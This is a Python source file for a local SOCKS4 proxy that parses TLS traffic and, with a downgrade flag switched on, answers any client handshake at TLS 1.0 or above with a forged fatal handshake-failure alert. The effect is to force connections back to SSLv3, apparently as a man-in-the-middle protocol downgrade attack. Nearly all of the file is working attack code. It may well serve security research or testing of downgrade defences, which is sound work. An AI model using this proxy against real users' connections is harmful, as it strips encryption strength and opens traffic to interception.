import socketserver
import socket
import select
import os
import io
import sys

from tls import Message, build_fatal_alert, AlertDescription
from tls import ContentType, HandshakeType, CipherSuite, ProtocolVersion

MAX = 8192
ENABLE_DOWNGRADE = True

def dump(why, bb):
    #print(why, len(bb), '::', ''.join(['{0:02x}'.format(x) for x in bb]))
    pass

class socks_handler(socketserver.BaseRequestHandler):
    def handle_socks_setup(self):
        req = self.request.recv(9)
        if len(req) != 9:
            raise IOError('short socks4 request')
        
        ver, cmd, port, ip, nul = req[0], req[1], req[2:4], req[4:8], req[8]
        assert ver == 0x04
        assert cmd == 0x01
        assert nul == 0x00
        
        self.backend_ip = '{0}.{1}.{2}.{3}'.format(*ip)
        self.backend_port = port[0] << 8 | port[1]
        
        self.backend = socket.create_connection((self.backend_ip, self.backend_port))
        self.request.sendall(bytes([0, 0x5a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]))

    def tls_incoming(self, m):
        #print('incoming from remote', m)
        
        if m.type == ContentType.ChangeCipherSpec:
            self.seen_changecipherspec = True

        if m.type == ContentType.Handshake and not m.opaque and m.body.type == HandshakeType.ServerHello:
            print('server selected', CipherSuite.tostring(m.body.body.ciphersuite))

        self.request.sendall(bytes(m))

    def tls_outgoing(self, m):
        #print('outgoing from local', m)
        
        if m.type == ContentType.ChangeCipherSpec:
            self.seen_changecipherspec = True
            
        if m.type == ContentType.Handshake and m.version >= ProtocolVersion.TLSv1_0 and ENABLE_DOWNGRADE:
            print('sabotaging >= TLS1.0')
            self.request.sendall(bytes(build_fatal_alert(AlertDescription.HandshakeFailure)))
            return
        
        self.backend.sendall(bytes(m))

    def check_buf(self, buf, handler):
        while Message.prefix_has_full_frame(bytes(buf)):
            m = Message.decode(bytes(buf), opaque = self.seen_changecipherspec)
            lm = len(bytes(m))
            assert bytes(m) == bytes(buf[0:lm])
            del buf[0:lm]
            handler(m)

    def echo(self, buf, out):
        out.sendall(bytes(buf))
        buf[:] = []

    def check_bufs(self):
        if self.tls_enabled:
            self.check_buf(self.oubuf, self.tls_outgoing)
            self.check_buf(self.inbuf, self.tls_incoming)
        else:
            self.echo(self.oubuf, self.backend)
            self.echo(self.inbuf, self.request)

    def handle(self):        
        self.handle_socks_setup()
        self.inbuf = []
        self.oubuf = []
        self.seen_changecipherspec = False

        self.tls_enabled = self.backend_port in (443, 4433)

        try:
            while True:
                r, w, x = select.select([self.backend, self.request],
                                        [],
                                        [self.backend, self.request],
                                        1)

                if x:
                    raise IOError('socket error: {0}'.format(x))

                if self.backend in r:
                    packet = bytes(self.backend.recv(MAX))
                    if len(packet) == 0:
                        break
                    dump('incoming', packet)
                    self.inbuf.extend(packet)
                    self.check_bufs()
                
                if self.request in r:
                    packet = bytes(self.request.recv(MAX))
                    if len(packet) == 0:
                        break
                    dump('outgoing', packet)
                    self.oubuf.extend(packet)
                    self.check_bufs()
                
        except KeyboardInterrupt:
            os._exit(1)
        finally:
            self.backend.close()
            self.request.close()

class RebindTCP(socketserver.ThreadingMixIn, socketserver.TCPServer):
    def __init__(self, *args, **kwargs):
        self.allow_reuse_address = True
        socketserver.TCPServer.__init__(self, *args, **kwargs)

if __name__ == '__main__':
    HOST, PORT = 'localhost', 3355

    server = RebindTCP((HOST, PORT), socks_handler)
    print('listening on', HOST, PORT)
    server.serve_forever()
